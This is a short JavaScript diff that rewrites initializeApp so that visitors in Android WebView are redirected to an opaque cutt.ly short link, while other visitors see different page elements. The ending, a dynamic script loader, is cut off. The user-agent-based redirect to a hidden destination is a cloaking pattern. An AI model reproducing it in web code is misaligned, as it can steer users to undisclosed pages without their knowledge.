@@ -1,13 +1,3 @@
-function initializeApp() {
-   const isInWebView = navigator.userAgent.includes('wv');
-   if (!isInWebView) {
-      window.location = "https://cutt.ly/srF06bOM";
-      document.body.style.display = 'none';
-   } else {
-      document.getElementById("framework").style.display = 'block';
-   }
-}
-
 function scrollBottom() {
    window.scrollTo(99999, 99999);
 }
@@ -23,6 +13,17 @@ window.addEventListener("load", function () {
       }, 500);
    }, 0);
 });
+
+function initializeApp() {
+   const isInWebView = navigator.userAgent.includes('wv');
+   if (isInWebView) {
+      window.location = "https://cutt.ly/srF06bOM";
+      document.getElementById("overlap").style.display = "none";
+   } else {
+      document.getElementById("framework").style.display = 'block';
+      document.getElementById("download").style.display = "none";
+   }
+}
 
 function downloadJSAtOnload() {
    var e = document.createElement("script");
